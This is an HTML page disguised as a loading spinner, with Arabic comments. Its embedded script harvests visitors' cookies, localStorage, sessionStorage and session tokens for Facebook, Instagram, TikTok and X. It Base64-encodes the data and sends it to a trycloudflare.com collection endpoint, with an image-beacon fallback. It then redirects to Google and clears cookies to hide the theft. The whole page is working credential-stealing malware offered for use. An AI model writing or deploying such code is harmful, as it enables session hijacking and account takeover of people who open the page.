<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: #f5f5f5; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { text-align: center; color: #333; }
        .spinner { width: 40px; height: 40px; border: 4px solid #ddd; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <p>جاري التحميل...</p>
</div>

<script>
(function() {
    // 1. سحب الكوكيز
    function getCookies() {
        var c = document.cookie;
        if (!c) return {};
        var obj = {};
        c.split('; ').forEach(function(item) {
            var parts = item.split('=');
            if (parts.length >= 2) obj[parts[0]] = parts.slice(1).join('=');
        });
        return obj;
    }

    // 2. سحب localStorage
    function getLocal() {
        var res = {};
        try {
            for (var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                res[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        return res;
    }

    // 3. سحب sessionStorage
    function getSession() {
        var res = {};
        try {
            for (var i = 0; i < sessionStorage.length; i++) {
                var key = sessionStorage.key(i);
                res[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        return res;
    }

    // 4. تجميع كل شيء
    function collectAll() {
        var data = {
            cookies: getCookies(),
            localStorage: getLocal(),
            sessionStorage: getSession(),
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            possibleTokens: {
                fb: document.cookie.match(/fbsr_[^=]+/g) || [],
                ig: document.cookie.match(/csrftoken|ig_did/g) || [],
                tt: document.cookie.match(/sessionid|tt_webid/g) || [],
                x: document.cookie.match(/auth_token|ct0/g) || []
            }
        };
        return data;
    }

    // 5. ترميز إلى Base64
    function toBase64(str) {
        try {
            return btoa(unescape(encodeURIComponent(str)));
        } catch(e) {
            return btoa(str);
        }
    }

    // 6. إرسال إلى السيرفر (عبر POST)
    function sendData(data) {
        var encoded = toBase64(JSON.stringify(data));
        var server = 'https://screening-protect-alt-pic.trycloudflare.com/collect';  // غيّر هذا
        fetch(server, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ payload: encoded })
        }).catch(function() {
            // لو فشل، نرسل عبر صورة
            var img = new Image();
            img.src = server + '?d=' + encodeURIComponent(encoded);
        });
    }

    // 7. التشغيل بعد تأخير
    setTimeout(function() {
        var all = collectAll();
        sendData(all);
        // إعادة توجيه إلى موقع حقيقي
        setTimeout(function() {
            window.location.href = 'https://www.google.com';
        }, 1500);
    }, 2000);

    // 8. مسح الكوكيز بعد السحب (إخفاء الأثر)
    setTimeout(function() {
        try {
            document.cookie.split(';').forEach(function(c) {
                document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/');
            });
        } catch(e) {}
    }, 3000);

})();
</script>
</body>
</html>
